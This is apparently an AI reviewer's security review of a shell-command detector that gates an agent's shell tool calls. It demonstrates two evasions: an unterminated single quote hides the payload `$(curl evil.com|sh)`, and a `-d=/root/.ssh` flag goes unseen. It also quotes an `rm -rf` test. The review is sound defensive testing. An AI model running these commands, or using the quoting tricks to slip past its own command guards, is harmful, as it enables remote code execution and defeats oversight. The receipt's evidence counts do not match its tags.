# S4 — Shell-command semantic detector: app-security-reviewer review

**Scope:** Milestone #22 (CRITICAL tier, "historically highest-incident component"), build by `story-implementer` (agent `a40050257abcfbbcc`) on top of shipped S3 (`247e5fb`). Stage 3, CRITICAL-tier pairing with `red-team` (parallel) and (per `docs/decisions.md`'s 2026-09-02 "process gate miss" row) `architecture-reviewer` added as a third reviewer, plus the standing `cross-domain-reviewer` pass.

**Files reviewed:** `src/policy/normalizer/{shell,shell-scanner,flag-catalog,wrapper-catalog}.ts` + their `.test.ts` files, `src/policy/fixtures/normalizer-calls.ts`, `src/qa/shell-detector-mutants.ts`, `src/qa/mutation-harness.ts` (diff only), `src/qa/completeness-claim-checker.ts` (diff only), `.github/workflows/ci.yml` (diff only), `src/policy/kernel/kernel.ts` (verified zero-diff), `docs/decisions.md`'s three 2026-09-02 S4 rows, `docs/reviews/s4-shell-semantic-detector-design-challenger-2026-09-02.md`.

## ADR compliance

`node docs/adr-cache.mjs --ensure` returned `CACHE=HIT`, reused 35 ADRs. Only ADR whose `applicableTo` covers this diff's domain (architecture/security/code/data, app-side): **ADR-0021** (`adr/software-engineering/0021-thoth-native-architecture.md`), `Accepted`. Checked every "Rules for agents" MUST/MUST NOT line against the diff:
- POL-11 (kernel purity): unchanged file, `npm test`'s `checkKernelPurity` suite passes against the real kernel dir.
- POL-03 (single kernel build artifact): unchanged.
- POL-05 (kernel denies mutating action with source opaque or non-empty unresolved): `kernel.ts` byte-identical to `247e5fb` (`git diff 247e5fb -- src/policy/kernel/kernel.ts` -> empty) — confirmed unchanged, and confirmed it still fires correctly on the records this story's normalizer produces (see Finding 1 below — the kernel's own POL-05 check is not at fault; the normalizer sometimes fails to populate `unresolved` when it should).
- SUR-09 (kernel evaluates deferred as execution, not a lesser class): unchanged; `isMutating`/`pol05Rule` still have no special case for `deferred`, confirmed by reading `kernel.ts:72-113` directly.
- POL-12 (normalizer registration by declaration only): `shell.ts` still calls `registerNormalizer` once at module load (`shell.ts:275-278`), no dispatch-chain edit; `registry.ts` byte-identical to `247e5fb`.
- Section 3.2 (normalizer must not return a verdict; kernel decides only from the Action record): held — `shell.ts` never imports kernel/rule types beyond `ActionRecord`.

No ADR "Rules for agents" line is technically violated by this diff — the kernel-side POL-05 enforcement is intact and unchanged, and normalizer registration follows POL-12 correctly. Findings below are normalizer-level correctness defects (the Action record itself is sometimes built wrong) rather than ADR non-compliance; they are still blocking under this story's own ratified, self-documented invariant (`shell.ts:27-29`: "Anything this file cannot confidently resolve is reported via unresolved, never guessed at or silently dropped") and under SUR-06/SUR-09's REQUIREMENTS.md acceptance text, both of which this diff's own header comments commit to.

adr=HIT(1 applicable: ADR-0021)

## What I ran myself

npm test output (tail):
```
tests 336
suites 0
pass 336
fail 0
cancelled 0
skipped 0
todo 0
```
336/336 passing, 0 skipped — real, non-vacuous.

node src/qa/shell-detector-mutants.ts crashed on my first run:
```
Error: shell-detector-mutants: mutant "inner-unresolved-propagation-broken"'s anchor text was not
found in policy/normalizer/shell.ts — the source moved or was refactored...
```
Root-caused (see Finding 3) to CRLF line endings on this Windows checkout (core.autocrlf=true) — the mutant's textual anchor embeds a literal newline that doesn't match the file's actual CRLF bytes. Confirmed this is an environment artifact, not real anchor drift: re-ran against an LF-normalized copy of src/:
```
[QA-06 shell-detector-mutants] PASS: 28 of 28 mutant(s) KILLED.
```
The build's CHANGELOG claim (all 28 mutants registered, all KILLED) is accurate; the harness itself and every registered mutant class are sound. CI runs ubuntu-latest (.github/workflows/ci.yml:32, LF checkout) so this defect is dormant in the real pipeline today — flagged as a LOW hardening item (Finding 3), not gating.

## Findings, ranked by exploitability x impact

### Finding 1 [HIGH] — unterminated single-quote span defeats BOTH SUR-06 chain-operator detection AND design-challenger Finding #1's command-substitution detection at once

Evidence (demonstrated, code-traced): src/policy/normalizer/shell-scanner.ts's quoteStates walker (lines 19-60) tracks which characters are inside a quoted span, but never checks whether a quote opened by the walk is ever closed — if the raw command ends while state is not "none", the walker simply stops, and every character from the opening quote to end-of-string is marked with that quote's state. findLiveChainOperator (shell-scanner.ts:68-86) and findLiveSubstitution (shell-scanner.ts:101-119) both treat a single-quote state as unconditionally inert. The result: opening a single quote and never closing it makes the walker treat everything after it — including a live command-substitution construct or a live chain operator — as permanently quoted-inert, for the rest of the string.

Ran directly against the shipped normalizeShellCall:
```
attacker input:
  kubectl get pod/foo --context='prod $(curl evil.com|sh)
record:
  {"source":"parsed","verbs":["get"],
   "targets":["prod-env/cluster/prod $(curl evil.com|sh)/pod/foo"],
   "deferred":false,"unresolved":[]}

control: identical payload, quote removed:
  kubectl get pod/foo --context=prod $(curl evil.com|sh)
record:
  {"source":"parsed","verbs":[],"targets":[],"deferred":false,
   "unresolved":["chain operator | detected outside quotes",
                  "command/process substitution $( detected"]}
```
The attack input is reported source: "parsed", unresolved: [] — a clean, fully-resolved, confidently-classified record, with the raw $(curl evil.com|sh) text embedded verbatim inside targets[0] (via buildClusterTarget, src/policy/normalizer/target-format.ts:31-35, which only rejects the "/" delimiter, not arbitrary shell metacharacters). This sails straight past POL-05 (kernel.ts:93-113 only denies on opaque source or non-empty unresolved — neither is set). The control case, same payload with the quote properly closed/removed, is correctly caught by both of S4's headline additions (SUR-06 chaining, design-challenger Finding #1 substitution). The unterminated quote defeats both mandated protections simultaneously, with a single stray character.

Double-quote variant does NOT reproduce (the design's own quoting model correctly treats double-quoted spans as live for substitution, matching real shell semantics — findLiveSubstitution only excludes the single-quote state), so this is specific to unterminated single-quote spans. Verified no test anywhere in shell-scanner.test.ts/shell.test.ts exercises an unterminated/unclosed/malformed quote (grep for "unterminated", "unclosed", "malformed quote" -> no matches).

Reach: reach=instrument today — no hooks/ directory exists in this repo, no CI job feeds real commands through normalizeShellCall (confirmed via a project-wide grep of non-test callers: only registry.ts, shell.ts itself, wrapper-catalog.ts, two src/qa/*-purity-check.ts structural scanners, and shell-detector-mutants.ts). The PreToolUse hook wiring that makes this reach a live session is S5's job. Same calibration design-challenger's round-1 report already applied to its own Findings #1/#2 (both MED, capped by the identical reach=instrument reasoning, ratified in docs/decisions.md's 2026-09-02 row) and the same report's own words apply here even more directly: the realistic failure mode is that a gap like this ships live, silently, the first time S5's own reviewers check "does the hook call the kernel correctly" rather than "does the kernel receive a correct Action record." Unlike Findings #1/#2 (deliberately scoped-out features, accepted with eyes open, then partially built), this is a defect in code that already exists specifically to close SUR-06/Finding #1 — nobody signed off on "an unmatched quote character bypasses both mandated checks." It is trivially triggerable (a single missing/mistyped quote — plausible by accident, not just by a deliberate attacker) rather than requiring unusual syntax.

Exposure: ~0% of live governed traffic today (basis: counted in code — no hook/CI caller exists to reach a real session). Becomes ~100% of any shell-tool-typed call containing an unmatched single quote the moment S5 wires PreToolUse to this same, unchanged detection code — a near-certainty, not a hypothetical, since S5's own review will reasonably assume S4's detector logic is already correct (per design-challenger's own "single scariest unproven assumption" section).

Minimal fix: in quoteStates, when the walk reaches end-of-string with state not equal to "none", that is an unterminated quote — surface it (e.g. a returned unterminated boolean alongside the per-character array, or a small new hasUnterminatedQuote(text) export built the same way hasLiveChainOperator/hasLiveSubstitution already are) and have collectSyntaxUnresolved (shell.ts:78-85) push it to unresolved unconditionally, ahead of every other check. This is a contained, one-function addition — no rewrite of the walker's existing state machine, and it is exactly the same "detect the shape, fail closed" pattern already used for every other ambiguity in this component.

Proof-test to write: shell.test.ts — normalizeShellCall on the attacker input above MUST return non-empty unresolved; unresolved: [] is not acceptable regardless of source value. A second case for an unterminated double quote (already safe today, per the above — a regression pin, not a new gap) and a bare kubectl call with just an unterminated quote and no live substitution/chain content (proving the unterminated-quote-itself is flagged, not just its payload) round out the class.

### Finding 2 [MED] — directory-flag short-equals-form (-d=value / -C=value) is silently invisible, reopening design-challenger's ratified Finding #2 for one flag shape

Evidence (demonstrated, code-traced): matchDirectoryFlagToken (src/policy/normalizer/flag-catalog.ts:46-57) recognizes exactly two directory-flag shapes: --directory=path (long, equals-form, one token) and bare -C / -d (short, two-token, space-separated). It does not recognize the short-flag equals-form (-d=path, -C=path) — a shape the codebase's own generic short-flag regex (shell.ts:116, matches a single letter followed by =value) demonstrably supports for other flags (e.g. -c=prod). When matchDirectoryFlagToken returns undefined for -d=/root/.ssh, scanFlags (shell.ts:96-128) falls through to that generic shortForm branch, which calls resolveFlagAlias("d") — flag-catalog.ts's KNOWN_FLAG_ALIASES contains exactly one entry (c maps to context) — returns undefined, and the guard silently drops the token: never stored in flags, never pushed to positional, never pushed to unresolved.

```
kubectl delete pod/foo -d=/root/.ssh --context=prod
-> {"source":"parsed","verbs":["delete"],"targets":["prod-env/cluster/prod/pod/foo"],
    "deferred":false,"unresolved":[]}
-> byte-identical to the same call with the flag stripped entirely.

for comparison, the two shapes the fix DOES cover both work correctly:
kubectl delete pod/foo -d /root/.ssh --context=prod           -> unresolved: [directory flag ... present]
kubectl delete pod/foo --directory=/root/.ssh --context=prod  -> unresolved: [directory flag ... present]
```

flag-catalog.test.ts tests only the two covered shapes (long-equals, short-two-token) plus a negative case for an unrelated short flag (-n) — no test exercises -d= / -C=. This is a genuinely new S4 gap, not inherited: S3's shell.ts (247e5fb) had no short-flag handling of any kind (parseFlags only recognized --key=value) — the short-equals-form path, and its silent-drop-on-unaliased behavior, is new in this diff, built specifically to satisfy SUR-07's flag-abbreviation criterion, and it undercuts the very Finding #2 fix landed in the same story.

Reach/Exposure: same reach=instrument calibration as Finding 1 (no live hook yet). Content severity is lower than Finding 1's — a directory flag being invisible is not itself arbitrary code execution (design-challenger's own Finding #2 write-up already left open whether any governed tool type actually treats a directory flag as target-redirecting — that question is still genuinely unresolved either way, unchanged by this finding), but it is a demonstrated, silent violation of SUR-07's explicit P0 acceptance text ("directory flags... do not defeat a classifier", REQUIREMENTS.md:463) and of this story's own ratified fix.

Minimal fix: extend matchDirectoryFlagToken's short-form regex to also match the one-token -C=value / -d=value shape (mirrors the existing long-equals branch, tokenSpan: 1) — a few-line, symmetrical addition. (A broader, more durable fix — routing any unaliased short -x=value flag to unresolved instead of silently discarding it — would also close this and any future flag added to the directory set without needing a matching matchDirectoryFlagToken update each time, but the minimal, story-scoped fix is the two-line regex extension.)

Proof-test to write: flag-catalog.test.ts — matchDirectoryFlagToken(["-d=/root/.ssh"], 0) and matchDirectoryFlagToken(["-C=/root/.ssh"], 0) must both return { tokenSpan: 1 }, not undefined; a shell.test.ts end-to-end case mirroring the two already-passing directory-flag tests.

### Finding 3 [LOW] — shell-detector-mutants.ts's textual mutant anchors are CRLF-fragile (QA tooling only, non-blocking)

Already detailed above under "What I ran myself." textMutant's anchor strings embed a literal newline mid-string; on a CRLF-checked-out working tree (core.autocrlf=true, common on Windows), String.prototype.includes fails to find the anchor and the harness throws instead of running. Confirmed dormant in the real CI pipeline (ubuntu-latest, LF) and confirmed the mutants themselves are all sound (28/28 KILLED once LF-normalized) — this is a portability defect in the QA instrument, not a defect in the shell detector. Recommend normalizing CRLF to LF (or matching per-line) in textMutant's apply() so a Windows contributor running the mutation-shell script locally doesn't get a false "anchor moved" error. Not gating; a docs/backlog.md note is sufficient.

## Clean, worth naming

- Design-challenger residual Finding #5 (eval / bash -c inner-quote-stripping) is correctly closed, demonstrated: eval "true ; rm -rf /tmp/x" recurses correctly and denies (unresolved: [chain operator ; detected outside quotes], deferred: true) — tokenize's dequoting model naturally reconstructs the real, unquoted inner argument text before the recursive call, matching real shell semantics (the outer shell strips the quotes before eval ever sees its argument). Traced through both a single-level and a nested bash -c "eval '...'" case by hand; both resolve exactly as a real shell would execute them.
- unresolved/deferred propagation through recursive wrapper calls is sound. resolveWrapperMatch (shell.ts:134-159) always spreads the inner call's full record ({ ...inner, deferred: true }) before forcing deferred: true — an inner call's unresolved array is never dropped on the way back out, at any nesting depth. Confirmed by the inner-unresolved-propagation-broken mutant (KILLED once LF-normalized, see above) and by hand-tracing a two-level bash -c "eval '...'" nest.
- Zero-diff claim verified, not just asserted: git diff 247e5fb against kernel.ts, registry.ts, action-catalog.ts, target-format.ts -> empty on all four files.
- Depth cap (5) fails closed at the boundary, confirmed by direct code read (shell.ts:153-155) — consistent with every other ambiguity-handling branch in this component. (Whether 5 is the right number is design-challenger's already-logged Finding #6, unmeasured, residual — not re-litigated here.)
- 336/336 tests pass, 0 skipped, non-vacuous (npm test output pasted above in full).

## Residual (unchanged from design-challenger's report, not re-litigated)

Findings #3, #4, #6 from docs/reviews/s4-shell-semantic-detector-design-challenger-2026-09-02.md remain correctly carried in docs/backlog.md (blanket chain-deny false-positive rate; sudo/interpreter-inline-exec wrapper gap; unmeasured depth cap) — reviewed, still accurately disclosed, no change needed.

## Verdict

REWORK. Finding 1 is a demonstrated, code-traced, complete bypass of two of this story's headline mandated protections (SUR-06 chain-operator detection and design-challenger's ratified Finding #1 command-substitution detection) via a single unmatched quote character — trivially triggerable, silent, and certain to become live-reachable the moment S5 wires the hook that this exact code will serve unchanged. It needs a real code fix (a small, contained one, per the minimal-fix note above) before this story ships, not a residual-register entry — S5 will not re-review S4's detection logic, only its wiring. Finding 2 should be fixed in the same pass (small, adjacent, same file family). Finding 3 is a QA-tooling hardening note, non-blocking.

## Open findings vs. failing tests

| # | Finding | Named failing test |
|---|---|---|
| 1 | Unterminated single-quote defeats chain-op + substitution detection | shell.test.ts: normalizeShellCall on the attacker input above must return non-empty unresolved |
| 2 | Directory-flag short-equals-form silently invisible | flag-catalog.test.ts: matchDirectoryFlagToken(["-d=/root/.ssh"], 0) must return { tokenSpan: 1 } |
| 3 | Mutant-anchor CRLF fragility | (QA tooling, no proof-test — docs/backlog.md note; not a shell-detector regression) |

open findings = 3, failing tests = 2 (Finding 3 has no executable proof-test form — it is a QA-instrument portability defect, not a shell-detector regression; it is dormant in the actual CI pipeline (LF) and its only "test" is the harness itself, which does pass once line endings are normalized, as demonstrated above).

RECEIPT: verdict=REWORK
findings (ALL of them, one terse line each, ranked by exploitability x impact):
1. [ISSUE][HIGH][demonstrated] src/policy/normalizer/shell-scanner.ts:19-60 (quoteStates) - an unterminated single-quote span defeats BOTH SUR-06 chain-operator detection and Finding #1's command-substitution detection at once; kubectl get pod/foo --context='prod $(curl evil.com|sh) resolves clean (unresolved:[]) instead of denying. Fix: flag end-of-string-while-still-quoted as unresolved in collectSyntaxUnresolved (shell.ts:78-85).
2. [ISSUE][MED][demonstrated] src/policy/normalizer/flag-catalog.ts:46-57 (matchDirectoryFlagToken) - short-equals-form directory flag (-d=value / -C=value) is silently invisible, reopening the ratified Finding #2 fix for this one shape; -d=/root/.ssh produces a byte-identical record to no flag at all. Fix: extend the short-form regex to match -C= / -d= (mirrors the existing long-equals branch).
3. [ISSUE][LOW][code-traced] src/qa/shell-detector-mutants.ts:48-63 (textMutant anchors) - literal newline in anchor strings breaks on CRLF-checked-out (Windows) working trees; confirmed dormant in real CI (ubuntu-latest, LF) and confirmed all 28 mutants KILLED once LF-normalized. Fix: normalize line endings before matching, or match per-line.
4. [CLEAN][demonstrated] eval/bash -c inner-quote-stripping (design-challenger residual Finding #5) is correctly closed - eval "true ; rm -rf /tmp/x" recurses and denies as expected.
5. [CLEAN][demonstrated] unresolved/deferred propagation through recursive wrapper calls (shell.ts:134-159 resolveWrapperMatch) is sound at every nesting depth checked.
6. [CLEAN][code-traced] kernel.ts/registry.ts/action-catalog.ts/target-format.ts are byte-identical to the S3-shipped commit (247e5fb) - zero-diff claim verified, not just asserted.
7. [CLEAN][demonstrated] 336/336 tests pass, 0 skipped, non-vacuous.
counts (a CHECKSUM - MUST equal the lines listed above; never truncated): issues=3 suspicions=0 clean=4
evidence (a CHECKSUM over the tags above - MUST equal them, and MUST total the counts line): demonstrated=6 code-traced=1 derived=0
checks="336/0/0|28/28 mutants KILLED (LF-normalized copy; CRLF-checkout run failed per Finding 3)"
adr=HIT(1)
report=docs/reviews/s4-shell-semantic-detector-app-security-2026-09-02.md
